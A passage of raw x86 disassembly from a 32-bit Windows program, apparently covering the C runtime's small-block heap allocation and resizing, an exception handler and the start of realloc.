  42510a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42510f:	xor    edi,edi
  425111:	inc    edi
  425112:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425119:	mov    al,BYTE PTR [esi+0x43]
  42511c:	mov    cl,al
  42511e:	inc    cl
  425120:	test   al,al
  425122:	mov    eax,DWORD PTR [ebp+0x8]
  425125:	mov    BYTE PTR [esi+0x43],cl
  425128:	jne    0x42512d
  42512a:	or     DWORD PTR [eax+0x4],edi
  42512d:	mov    edx,0x80000000
  425132:	mov    ecx,ebx
  425134:	shr    edx,cl
  425136:	not    edx
  425138:	and    DWORD PTR [eax+0x8],edx
  42513b:	mov    eax,ebx
  42513d:	pop    edi
  42513e:	pop    esi
  42513f:	pop    ebx
  425140:	leave  
  425141:	ret    
  425142:	push   ebp
  425143:	mov    ebp,esp
  425145:	sub    esp,0xc
  425148:	mov    ecx,DWORD PTR [ebp+0x8]
  42514b:	mov    eax,DWORD PTR [ecx+0x10]
  42514e:	push   ebx
  42514f:	push   esi
  425150:	mov    esi,DWORD PTR [ebp+0x10]
  425153:	push   edi
  425154:	mov    edi,DWORD PTR [ebp+0xc]
  425157:	mov    edx,edi
  425159:	sub    edx,DWORD PTR [ecx+0xc]
  42515c:	add    esi,0x17
  42515f:	shr    edx,0xf
  425162:	mov    ecx,edx
  425164:	imul   ecx,ecx,0x204
  42516a:	lea    ecx,[ecx+eax*1+0x144]
  425171:	mov    DWORD PTR [ebp-0xc],ecx
  425174:	mov    ecx,DWORD PTR [edi-0x4]
  425177:	and    esi,0xfffffff0
  42517a:	dec    ecx
  42517b:	cmp    esi,ecx
  42517d:	lea    edi,[ecx+edi*1-0x4]
  425181:	mov    ebx,DWORD PTR [edi]
  425183:	mov    DWORD PTR [ebp+0x10],ecx
  425186:	mov    DWORD PTR [ebp-0x4],ebx
  425189:	jle    0x4252e4
  42518f:	test   bl,0x1
  425192:	jne    0x4252dd
  425198:	add    ebx,ecx
  42519a:	cmp    esi,ebx
  42519c:	jg     0x4252dd
  4251a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251a5:	sar    ecx,0x4
  4251a8:	dec    ecx
  4251a9:	cmp    ecx,0x3f
  4251ac:	mov    DWORD PTR [ebp-0x8],ecx
  4251af:	jbe    0x4251b7
  4251b1:	push   0x3f
  4251b3:	pop    ecx
  4251b4:	mov    DWORD PTR [ebp-0x8],ecx
  4251b7:	mov    ebx,DWORD PTR [edi+0x4]
  4251ba:	cmp    ebx,DWORD PTR [edi+0x8]
  4251bd:	jne    0x425202
  4251bf:	cmp    ecx,0x20
  4251c2:	mov    ebx,0x80000000
  4251c7:	jae    0x4251e3
  4251c9:	shr    ebx,cl
  4251cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4251ce:	lea    ecx,[ecx+eax*1+0x4]
  4251d2:	not    ebx
  4251d4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4251d8:	dec    BYTE PTR [ecx]
  4251da:	jne    0x425202
  4251dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251df:	and    DWORD PTR [ecx],ebx
  4251e1:	jmp    0x425202
  4251e3:	add    ecx,0xffffffe0
  4251e6:	shr    ebx,cl
  4251e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4251eb:	lea    ecx,[ecx+eax*1+0x4]
  4251ef:	not    ebx
  4251f1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4251f8:	dec    BYTE PTR [ecx]
  4251fa:	jne    0x425202
  4251fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251ff:	and    DWORD PTR [ecx+0x4],ebx
  425202:	mov    ecx,DWORD PTR [edi+0x8]
  425205:	mov    ebx,DWORD PTR [edi+0x4]
  425208:	mov    DWORD PTR [ecx+0x4],ebx
  42520b:	mov    ecx,DWORD PTR [edi+0x4]
  42520e:	mov    edi,DWORD PTR [edi+0x8]
  425211:	mov    DWORD PTR [ecx+0x8],edi
  425214:	mov    ecx,DWORD PTR [ebp+0x10]
  425217:	sub    ecx,esi
  425219:	add    DWORD PTR [ebp-0x4],ecx
  42521c:	cmp    DWORD PTR [ebp-0x4],0x0
  425220:	jle    0x4252cb
  425226:	mov    edi,DWORD PTR [ebp-0x4]
  425229:	mov    ecx,DWORD PTR [ebp+0xc]
  42522c:	sar    edi,0x4
  42522f:	dec    edi
  425230:	cmp    edi,0x3f
  425233:	lea    ecx,[ecx+esi*1-0x4]
  425237:	jbe    0x42523c
  425239:	push   0x3f
  42523b:	pop    edi
  42523c:	mov    ebx,DWORD PTR [ebp-0xc]
  42523f:	lea    ebx,[ebx+edi*8]
  425242:	mov    DWORD PTR [ebp+0x10],ebx
  425245:	mov    ebx,DWORD PTR [ebx+0x4]
  425248:	mov    DWORD PTR [ecx+0x4],ebx
  42524b:	mov    ebx,DWORD PTR [ebp+0x10]
  42524e:	mov    DWORD PTR [ecx+0x8],ebx
  425251:	mov    DWORD PTR [ebx+0x4],ecx
  425254:	mov    ebx,DWORD PTR [ecx+0x4]
  425257:	mov    DWORD PTR [ebx+0x8],ecx
  42525a:	mov    ebx,DWORD PTR [ecx+0x4]
  42525d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425260:	jne    0x4252b9
  425262:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425266:	mov    BYTE PTR [ebp+0x13],cl
  425269:	inc    cl
  42526b:	cmp    edi,0x20
  42526e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425272:	jae    0x425290
  425274:	cmp    BYTE PTR [ebp+0x13],0x0
  425278:	jne    0x425288
  42527a:	mov    ecx,edi
  42527c:	mov    ebx,0x80000000
  425281:	shr    ebx,cl
  425283:	mov    ecx,DWORD PTR [ebp+0x8]
  425286:	or     DWORD PTR [ecx],ebx
  425288:	lea    eax,[eax+edx*4+0x44]
  42528c:	mov    ecx,edi
  42528e:	jmp    0x4252b0
  425290:	cmp    BYTE PTR [ebp+0x13],0x0
  425294:	jne    0x4252a6
  425296:	lea    ecx,[edi-0x20]
  425299:	mov    ebx,0x80000000
  42529e:	shr    ebx,cl
  4252a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252a3:	or     DWORD PTR [ecx+0x4],ebx
  4252a6:	lea    eax,[eax+edx*4+0xc4]
  4252ad:	lea    ecx,[edi-0x20]
  4252b0:	mov    edx,0x80000000
  4252b5:	shr    edx,cl
  4252b7:	or     DWORD PTR [eax],edx
  4252b9:	mov    edx,DWORD PTR [ebp+0xc]
  4252bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252bf:	lea    eax,[edx+esi*1-0x4]
  4252c3:	mov    DWORD PTR [eax],ecx
  4252c5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4252c9:	jmp    0x4252ce
  4252cb:	mov    edx,DWORD PTR [ebp+0xc]
  4252ce:	lea    eax,[esi+0x1]
  4252d1:	mov    DWORD PTR [edx-0x4],eax
  4252d4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4252d8:	jmp    0x425419
  4252dd:	xor    eax,eax
  4252df:	jmp    0x42541c
  4252e4:	jge    0x425419
  4252ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ed:	sub    DWORD PTR [ebp+0x10],esi
  4252f0:	lea    ecx,[esi+0x1]
  4252f3:	mov    DWORD PTR [ebx-0x4],ecx
  4252f6:	lea    ebx,[ebx+esi*1-0x4]
  4252fa:	mov    esi,DWORD PTR [ebp+0x10]
  4252fd:	sar    esi,0x4
  425300:	dec    esi
  425301:	cmp    esi,0x3f
  425304:	mov    DWORD PTR [ebp+0xc],ebx
  425307:	mov    DWORD PTR [ebx-0x4],ecx
  42530a:	jbe    0x42530f
  42530c:	push   0x3f
  42530e:	pop    esi
  42530f:	test   BYTE PTR [ebp-0x4],0x1
  425313:	jne    0x425399
  425319:	mov    esi,DWORD PTR [ebp-0x4]
  42531c:	sar    esi,0x4
  42531f:	dec    esi
  425320:	cmp    esi,0x3f
  425323:	jbe    0x425328
  425325:	push   0x3f
  425327:	pop    esi
  425328:	mov    ecx,DWORD PTR [edi+0x4]
  42532b:	cmp    ecx,DWORD PTR [edi+0x8]
  42532e:	jne    0x425372
  425330:	cmp    esi,0x20
  425333:	mov    ebx,0x80000000
  425338:	jae    0x425353
  42533a:	mov    ecx,esi
  42533c:	shr    ebx,cl
  42533e:	lea    esi,[esi+eax*1+0x4]
  425342:	not    ebx
  425344:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425348:	dec    BYTE PTR [esi]
  42534a:	jne    0x42536f
  42534c:	mov    ecx,DWORD PTR [ebp+0x8]
  42534f:	and    DWORD PTR [ecx],ebx
  425351:	jmp    0x42536f
  425353:	lea    ecx,[esi-0x20]
  425356:	shr    ebx,cl
  425358:	lea    ecx,[esi+eax*1+0x4]
  42535c:	not    ebx
  42535e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425365:	dec    BYTE PTR [ecx]
  425367:	jne    0x42536f
  425369:	mov    ecx,DWORD PTR [ebp+0x8]
  42536c:	and    DWORD PTR [ecx+0x4],ebx
  42536f:	mov    ebx,DWORD PTR [ebp+0xc]
  425372:	mov    ecx,DWORD PTR [edi+0x8]
  425375:	mov    esi,DWORD PTR [edi+0x4]
  425378:	mov    DWORD PTR [ecx+0x4],esi
  42537b:	mov    esi,DWORD PTR [edi+0x8]
  42537e:	mov    ecx,DWORD PTR [edi+0x4]
  425381:	mov    DWORD PTR [ecx+0x8],esi
  425384:	mov    esi,DWORD PTR [ebp+0x10]
  425387:	add    esi,DWORD PTR [ebp-0x4]
  42538a:	mov    DWORD PTR [ebp+0x10],esi
  42538d:	sar    esi,0x4
  425390:	dec    esi
  425391:	cmp    esi,0x3f
  425394:	jbe    0x425399
  425396:	push   0x3f
  425398:	pop    esi
  425399:	mov    ecx,DWORD PTR [ebp-0xc]
  42539c:	lea    ecx,[ecx+esi*8]
  42539f:	mov    edi,DWORD PTR [ecx+0x4]
  4253a2:	mov    DWORD PTR [ebx+0x8],ecx
  4253a5:	mov    DWORD PTR [ebx+0x4],edi
  4253a8:	mov    DWORD PTR [ecx+0x4],ebx
  4253ab:	mov    ecx,DWORD PTR [ebx+0x4]
  4253ae:	mov    DWORD PTR [ecx+0x8],ebx
  4253b1:	mov    ecx,DWORD PTR [ebx+0x4]
  4253b4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4253b7:	jne    0x425410
  4253b9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4253bd:	mov    BYTE PTR [ebp+0xf],cl
  4253c0:	inc    cl
  4253c2:	cmp    esi,0x20
  4253c5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4253c9:	jae    0x4253e7
  4253cb:	cmp    BYTE PTR [ebp+0xf],0x0
  4253cf:	jne    0x4253df
  4253d1:	mov    ecx,esi
  4253d3:	mov    edi,0x80000000
  4253d8:	shr    edi,cl
  4253da:	mov    ecx,DWORD PTR [ebp+0x8]
  4253dd:	or     DWORD PTR [ecx],edi
  4253df:	lea    eax,[eax+edx*4+0x44]
  4253e3:	mov    ecx,esi
  4253e5:	jmp    0x425407
  4253e7:	cmp    BYTE PTR [ebp+0xf],0x0
  4253eb:	jne    0x4253fd
  4253ed:	lea    ecx,[esi-0x20]
  4253f0:	mov    edi,0x80000000
  4253f5:	shr    edi,cl
  4253f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4253fa:	or     DWORD PTR [ecx+0x4],edi
  4253fd:	lea    eax,[eax+edx*4+0xc4]
  425404:	lea    ecx,[esi-0x20]
  425407:	mov    edx,0x80000000
  42540c:	shr    edx,cl
  42540e:	or     DWORD PTR [eax],edx
  425410:	mov    eax,DWORD PTR [ebp+0x10]
  425413:	mov    DWORD PTR [ebx],eax
  425415:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425419:	xor    eax,eax
  42541b:	inc    eax
  42541c:	pop    edi
  42541d:	pop    esi
  42541e:	pop    ebx
  42541f:	leave  
  425420:	ret    
  425421:	push   ebp
  425422:	mov    ebp,esp
  425424:	sub    esp,0x14
  425427:	mov    ecx,DWORD PTR [ebp+0x8]
  42542a:	mov    eax,ds:0x45cefc
  42542f:	mov    edx,DWORD PTR ds:0x45cf00
  425435:	add    ecx,0x17
  425438:	and    ecx,0xfffffff0
  42543b:	push   ebx
  42543c:	mov    DWORD PTR [ebp-0x10],ecx
  42543f:	sar    ecx,0x4
  425442:	push   esi
  425443:	lea    eax,[eax+eax*4]
  425446:	push   edi
  425447:	dec    ecx
  425448:	cmp    ecx,0x20
  42544b:	lea    edi,[edx+eax*4]
  42544e:	mov    DWORD PTR [ebp-0x4],edi
  425451:	jge    0x42545e
  425453:	or     esi,0xffffffff
  425456:	shr    esi,cl
  425458:	or     DWORD PTR [ebp-0x8],0xffffffff
  42545c:	jmp    0x42546b
  42545e:	add    ecx,0xffffffe0
  425461:	or     eax,0xffffffff
  425464:	xor    esi,esi
  425466:	shr    eax,cl
  425468:	mov    DWORD PTR [ebp-0x8],eax
  42546b:	mov    eax,ds:0x45cf08
  425470:	mov    ebx,eax
  425472:	mov    DWORD PTR [ebp-0xc],esi
  425475:	cmp    ebx,edi
  425477:	jmp    0x42548d
  425479:	mov    ecx,DWORD PTR [ebx+0x4]
  42547c:	mov    edi,DWORD PTR [ebx]
  42547e:	and    ecx,DWORD PTR [ebp-0x8]
  425481:	and    edi,esi
  425483:	or     ecx,edi
  425485:	jne    0x425492
  425487:	add    ebx,0x14
  42548a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42548d:	mov    DWORD PTR [ebp+0x8],ebx
  425490:	jb     0x425479
  425492:	cmp    ebx,DWORD PTR [ebp-0x4]
  425495:	jne    0x4254bb
  425497:	mov    ebx,edx
  425499:	jmp    0x4254ac
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    edi,DWORD PTR [ebx]
  4254a0:	and    ecx,DWORD PTR [ebp-0x8]
  4254a3:	and    edi,esi
  4254a5:	or     ecx,edi
  4254a7:	jne    0x4254b3
  4254a9:	add    ebx,0x14
  4254ac:	cmp    ebx,eax
  4254ae:	mov    DWORD PTR [ebp+0x8],ebx
  4254b1:	jb     0x42549b
  4254b3:	cmp    ebx,eax
  4254b5:	je     0x42554f
  4254bb:	mov    DWORD PTR ds:0x45cf08,ebx
  4254c1:	mov    eax,DWORD PTR [ebx+0x10]
  4254c4:	mov    edx,DWORD PTR [eax]
  4254c6:	cmp    edx,0xffffffff
  4254c9:	mov    DWORD PTR [ebp-0x4],edx
  4254cc:	je     0x4254e2
  4254ce:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4254d5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4254d9:	and    ecx,DWORD PTR [ebp-0x8]
  4254dc:	and    edi,esi
  4254de:	or     ecx,edi
  4254e0:	jne    0x425518
  4254e2:	mov    edx,DWORD PTR [eax+0xc4]
  4254e8:	and    edx,DWORD PTR [ebp-0x8]
  4254eb:	and    DWORD PTR [ebp-0x4],0x0
  4254ef:	lea    ecx,[eax+0x44]
  4254f2:	mov    esi,DWORD PTR [ecx]
  4254f4:	and    esi,DWORD PTR [ebp-0xc]
  4254f7:	or     edx,esi
  4254f9:	mov    esi,DWORD PTR [ebp-0xc]
  4254fc:	jne    0x425515
  4254fe:	mov    edx,DWORD PTR [ecx+0x84]
  425504:	and    edx,DWORD PTR [ebp-0x8]
  425507:	inc    DWORD PTR [ebp-0x4]
  42550a:	add    ecx,0x4
  42550d:	mov    edi,DWORD PTR [ecx]
  42550f:	and    edi,esi
  425511:	or     edx,edi
  425513:	je     0x4254fe
  425515:	mov    edx,DWORD PTR [ebp-0x4]
  425518:	mov    ecx,edx
  42551a:	imul   ecx,ecx,0x204
  425520:	lea    ecx,[ecx+eax*1+0x144]
  425527:	mov    DWORD PTR [ebp-0xc],ecx
  42552a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42552e:	xor    edi,edi
  425530:	and    ecx,esi
  425532:	jne    0x4255a1
  425534:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42553b:	and    ecx,DWORD PTR [ebp-0x8]
  42553e:	push   0x20
  425540:	pop    edi
  425541:	jmp    0x4255a1
  425543:	cmp    DWORD PTR [ebx+0x8],0x0
  425547:	jne    0x425554
  425549:	add    ebx,0x14
  42554c:	mov    DWORD PTR [ebp+0x8],ebx
  42554f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425552:	jb     0x425543
  425554:	cmp    ebx,DWORD PTR [ebp-0x4]
  425557:	jne    0x42557f
  425559:	mov    ebx,edx
  42555b:	jmp    0x425566
  42555d:	cmp    DWORD PTR [ebx+0x8],0x0
  425561:	jne    0x42556d
  425563:	add    ebx,0x14
  425566:	cmp    ebx,eax
  425568:	mov    DWORD PTR [ebp+0x8],ebx
  42556b:	jb     0x42555d
  42556d:	cmp    ebx,eax
  42556f:	jne    0x42557f
  425571:	call   0x424f85
  425576:	mov    ebx,eax
  425578:	test   ebx,ebx
  42557a:	mov    DWORD PTR [ebp+0x8],ebx
  42557d:	je     0x425597
  42557f:	push   ebx
  425580:	call   0x42503c
  425585:	pop    ecx
  425586:	mov    ecx,DWORD PTR [ebx+0x10]
  425589:	mov    DWORD PTR [ecx],eax
  42558b:	mov    eax,DWORD PTR [ebx+0x10]
  42558e:	cmp    DWORD PTR [eax],0xffffffff
  425591:	jne    0x4254bb
  425597:	xor    eax,eax
  425599:	jmp    0x425718
  42559e:	shl    ecx,1
  4255a0:	inc    edi
  4255a1:	test   ecx,ecx
  4255a3:	jge    0x42559e
  4255a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255a8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255ac:	mov    ecx,DWORD PTR [edx]
  4255ae:	sub    ecx,DWORD PTR [ebp-0x10]
  4255b1:	mov    esi,ecx
  4255b3:	sar    esi,0x4
  4255b6:	dec    esi
  4255b7:	cmp    esi,0x3f
  4255ba:	mov    DWORD PTR [ebp-0x8],ecx
  4255bd:	jle    0x4255c2
  4255bf:	push   0x3f
  4255c1:	pop    esi
  4255c2:	cmp    esi,edi
  4255c4:	je     0x4256cb
  4255ca:	mov    ecx,DWORD PTR [edx+0x4]
  4255cd:	cmp    ecx,DWORD PTR [edx+0x8]
  4255d0:	jne    0x42562e
  4255d2:	cmp    edi,0x20
  4255d5:	mov    ebx,0x80000000
  4255da:	jge    0x425602
  4255dc:	mov    ecx,edi
  4255de:	shr    ebx,cl
  4255e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4255e3:	lea    edi,[eax+edi*1+0x4]
  4255e7:	not    ebx
  4255e9:	mov    DWORD PTR [ebp-0x14],ebx
  4255ec:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4255f0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4255f4:	dec    BYTE PTR [edi]
  4255f6:	jne    0x42562b
  4255f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4255fe:	and    DWORD PTR [ebx],ecx
  425600:	jmp    0x42562e
  425602:	lea    ecx,[edi-0x20]
  425605:	shr    ebx,cl
  425607:	mov    ecx,DWORD PTR [ebp-0x4]
  42560a:	lea    ecx,[eax+ecx*4+0xc4]
  425611:	lea    edi,[eax+edi*1+0x4]
  425615:	not    ebx
  425617:	and    DWORD PTR [ecx],ebx
  425619:	dec    BYTE PTR [edi]
  42561b:	mov    DWORD PTR [ebp-0x14],ebx
  42561e:	jne    0x42562b
  425620:	mov    ebx,DWORD PTR [ebp+0x8]
  425623:	mov    ecx,DWORD PTR [ebp-0x14]
  425626:	and    DWORD PTR [ebx+0x4],ecx
  425629:	jmp    0x42562e
  42562b:	mov    ebx,DWORD PTR [ebp+0x8]
  42562e:	cmp    DWORD PTR [ebp-0x8],0x0
  425632:	mov    ecx,DWORD PTR [edx+0x8]
  425635:	mov    edi,DWORD PTR [edx+0x4]
  425638:	mov    DWORD PTR [ecx+0x4],edi
  42563b:	mov    ecx,DWORD PTR [edx+0x4]
  42563e:	mov    edi,DWORD PTR [edx+0x8]
  425641:	mov    DWORD PTR [ecx+0x8],edi
  425644:	je     0x4256d7
  42564a:	mov    ecx,DWORD PTR [ebp-0xc]
  42564d:	lea    ecx,[ecx+esi*8]
  425650:	mov    edi,DWORD PTR [ecx+0x4]
  425653:	mov    DWORD PTR [edx+0x8],ecx
  425656:	mov    DWORD PTR [edx+0x4],edi
  425659:	mov    DWORD PTR [ecx+0x4],edx
  42565c:	mov    ecx,DWORD PTR [edx+0x4]
  42565f:	mov    DWORD PTR [ecx+0x8],edx
  425662:	mov    ecx,DWORD PTR [edx+0x4]
  425665:	cmp    ecx,DWORD PTR [edx+0x8]
  425668:	jne    0x4256c8
  42566a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42566e:	mov    BYTE PTR [ebp+0xb],cl
  425671:	inc    cl
  425673:	cmp    esi,0x20
  425676:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42567a:	jge    0x42569f
  42567c:	cmp    BYTE PTR [ebp+0xb],0x0
  425680:	jne    0x42568d
  425682:	mov    edi,0x80000000
  425687:	mov    ecx,esi
  425689:	shr    edi,cl
  42568b:	or     DWORD PTR [ebx],edi
  42568d:	mov    ecx,esi
  42568f:	mov    edi,0x80000000
  425694:	shr    edi,cl
  425696:	mov    ecx,DWORD PTR [ebp-0x4]
  425699:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42569d:	jmp    0x4256c8
  42569f:	cmp    BYTE PTR [ebp+0xb],0x0
  4256a3:	jne    0x4256b2
  4256a5:	lea    ecx,[esi-0x20]
  4256a8:	mov    edi,0x80000000
  4256ad:	shr    edi,cl
  4256af:	or     DWORD PTR [ebx+0x4],edi
  4256b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b5:	lea    edi,[eax+ecx*4+0xc4]
  4256bc:	lea    ecx,[esi-0x20]
  4256bf:	mov    esi,0x80000000
  4256c4:	shr    esi,cl
  4256c6:	or     DWORD PTR [edi],esi
  4256c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4256cb:	test   ecx,ecx
  4256cd:	je     0x4256da
  4256cf:	mov    DWORD PTR [edx],ecx
  4256d1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4256d5:	jmp    0x4256da
  4256d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4256da:	mov    esi,DWORD PTR [ebp-0x10]
  4256dd:	add    edx,ecx
  4256df:	lea    ecx,[esi+0x1]
  4256e2:	mov    DWORD PTR [edx],ecx
  4256e4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4256e8:	mov    esi,DWORD PTR [ebp-0xc]
  4256eb:	mov    ecx,DWORD PTR [esi]
  4256ed:	test   ecx,ecx
  4256ef:	lea    edi,[ecx+0x1]
  4256f2:	mov    DWORD PTR [esi],edi
  4256f4:	jne    0x425710
  4256f6:	cmp    ebx,DWORD PTR ds:0x45cef8
  4256fc:	jne    0x425710
  4256fe:	mov    ecx,DWORD PTR [ebp-0x4]
  425701:	cmp    ecx,DWORD PTR ds:0x45cf10
  425707:	jne    0x425710
  425709:	and    DWORD PTR ds:0x45cef8,0x0
  425710:	mov    ecx,DWORD PTR [ebp-0x4]
  425713:	mov    DWORD PTR [eax],ecx
  425715:	lea    eax,[edx+0x4]
  425718:	pop    edi
  425719:	pop    esi
  42571a:	pop    ebx
  42571b:	leave  
  42571c:	ret    
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   esi
  425721:	inc    ebx
  425722:	xor    dh,BYTE PTR [eax]
  425724:	pop    eax
  425725:	inc    ebx
  425726:	xor    BYTE PTR [eax],dh
  425728:	push   ebp
  425729:	mov    ebp,esp
  42572b:	sub    esp,0x8
  42572e:	push   ebx
  42572f:	push   esi
  425730:	push   edi
  425731:	push   ebp
  425732:	cld    
  425733:	mov    ebx,DWORD PTR [ebp+0xc]
  425736:	mov    eax,DWORD PTR [ebp+0x8]
  425739:	test   DWORD PTR [eax+0x4],0x6
  425740:	jne    0x4257c8
  425746:	mov    DWORD PTR [ebp-0x8],eax
  425749:	mov    eax,DWORD PTR [ebp+0x10]
  42574c:	mov    DWORD PTR [ebp-0x4],eax
  42574f:	lea    eax,[ebp-0x8]
  425752:	mov    DWORD PTR [ebx-0x4],eax
  425755:	mov    esi,DWORD PTR [ebx+0xc]
  425758:	mov    edi,DWORD PTR [ebx+0x8]
  42575b:	cmp    esi,0xffffffff
  42575e:	je     0x4257c1
  425760:	lea    ecx,[esi+esi*2]
  425763:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425768:	je     0x4257af
  42576a:	push   esi
  42576b:	push   ebp
  42576c:	lea    ebp,[ebx+0x10]
  42576f:	call   DWORD PTR [edi+ecx*4+0x4]
  425773:	pop    ebp
  425774:	pop    esi
  425775:	mov    ebx,DWORD PTR [ebp+0xc]
  425778:	or     eax,eax
  42577a:	je     0x4257af
  42577c:	js     0x4257ba
  42577e:	mov    edi,DWORD PTR [ebx+0x8]
  425781:	push   ebx
  425782:	call   0x4266b0
  425787:	add    esp,0x4
  42578a:	lea    ebp,[ebx+0x10]
  42578d:	push   esi
  42578e:	push   ebx
  42578f:	call   0x4266f2
  425794:	add    esp,0x8
  425797:	lea    ecx,[esi+esi*2]
  42579a:	push   0x1
  42579c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257a0:	call   0x426786
  4257a5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257a8:	mov    DWORD PTR [ebx+0xc],eax
  4257ab:	call   DWORD PTR [edi+ecx*4+0x8]
  4257af:	mov    edi,DWORD PTR [ebx+0x8]
  4257b2:	lea    ecx,[esi+esi*2]
  4257b5:	mov    esi,DWORD PTR [edi+ecx*4]
  4257b8:	jmp    0x42575b
  4257ba:	mov    eax,0x0
  4257bf:	jmp    0x4257dd
  4257c1:	mov    eax,0x1
  4257c6:	jmp    0x4257dd
  4257c8:	push   ebp
  4257c9:	lea    ebp,[ebx+0x10]
  4257cc:	push   0xffffffff
  4257ce:	push   ebx
  4257cf:	call   0x4266f2
  4257d4:	add    esp,0x8
  4257d7:	pop    ebp
  4257d8:	mov    eax,0x1
  4257dd:	pop    ebp
  4257de:	pop    edi
  4257df:	pop    esi
  4257e0:	pop    ebx
  4257e1:	mov    esp,ebp
  4257e3:	pop    ebp
  4257e4:	ret    
  4257e5:	push   ebp
  4257e6:	mov    ecx,DWORD PTR [esp+0x8]
  4257ea:	mov    ebp,DWORD PTR [ecx]
  4257ec:	mov    eax,DWORD PTR [ecx+0x1c]
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ecx+0x18]
  4257f3:	push   eax
  4257f4:	call   0x4266f2
  4257f9:	add    esp,0x8
  4257fc:	pop    ebp
  4257fd:	ret    0x4
  425800:	call   0x42370d
  425805:	add    eax,0x8
  425808:	ret    
  425809:	push   0x14
  42580b:	push   0x428768
  425810:	call   0x423858
  425815:	mov    edi,DWORD PTR [ebp+0x8]
  425818:	xor    ebx,ebx
  42581a:	cmp    edi,ebx
  42581c:	jne    0x42582c
  42581e:	push   DWORD PTR [ebp+0xc]
  425821:	call   0x424582
  425826:	pop    ecx
  425827:	jmp    0x4259b0
  42582c:	mov    esi,DWORD PTR [ebp+0xc]
  42582f:	cmp    esi,ebx
  425831:	jne    0x42583f
  425833:	push   edi
  425834:	call   0x42446a
  425839:	pop    ecx
  42583a:	jmp    0x4259ae
  42583f:	cmp    DWORD PTR ds:0x45d144,0x3
  425846:	jne    0x42597a
  42584c:	mov    DWORD PTR [ebp-0x1c],ebx
  42584f:	cmp    esi,0xffffffe0
  425852:	ja     0x425949
  425858:	push   0x4
  42585a:	call   0x423a1f
  42585f:	pop    ecx
  425860:	mov    DWORD PTR [ebp-0x4],ebx
  425863:	push   edi
  425864:	call   0x424c42
  425869:	pop    ecx
  42586a:	mov    DWORD PTR [ebp-0x20],eax
  42586d:	cmp    eax,ebx
  42586f:	je     0x425919
  425875:	cmp    esi,DWORD PTR ds:0x45cf04
  42587b:	ja     0x4258c9
  42587d:	push   esi
  42587e:	push   edi
  42587f:	push   eax
  425880:	call   0x425142
  425885:	add    esp,0xc
  425888:	test   eax,eax
  42588a:	je     0x425891
  42588c:	mov    DWORD PTR [ebp-0x1c],edi
  42588f:	jmp    0x4258c9
  425891:	push   esi
  425892:	call   0x425421
  425897:	pop    ecx
  425898:	mov    DWORD PTR [ebp-0x1c],eax
  42589b:	cmp    eax,ebx
  42589d:	je     0x4258c9
  42589f:	mov    eax,DWORD PTR [edi-0x4]
  4258a2:	dec    eax
  4258a3:	mov    DWORD PTR [ebp-0x24],eax
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x4258ac
  4258aa:	mov    eax,esi
  4258ac:	push   eax
  4258ad:	push   edi
  4258ae:	push   DWORD PTR [ebp-0x1c]
  4258b1:	call   0x4245a0
  4258b6:	push   edi
  4258b7:	call   0x424c42
  4258bc:	mov    DWORD PTR [ebp-0x20],eax
  4258bf:	push   edi
  4258c0:	push   eax
  4258c1:	call   0x424c6d
  4258c6:	add    esp,0x18
  4258c9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4258cc:	jne    0x425919
  4258ce:	cmp    esi,ebx
  4258d0:	jne    0x4258d8
  4258d2:	xor    esi,esi
  4258d4:	inc    esi
  4258d5:	mov    DWORD PTR [ebp+0xc],esi
  4258d8:	add    esi,0xf
  4258db:	and    esi,0xfffffff0
  4258de:	mov    DWORD PTR [ebp+0xc],esi
  4258e1:	push   esi
  4258e2:	push   ebx
  4258e3:	push   DWORD PTR ds:0x45d140
  4258e9:	call   DWORD PTR ds:0x4280a4
  4258ef:	mov    DWORD PTR [ebp-0x1c],eax
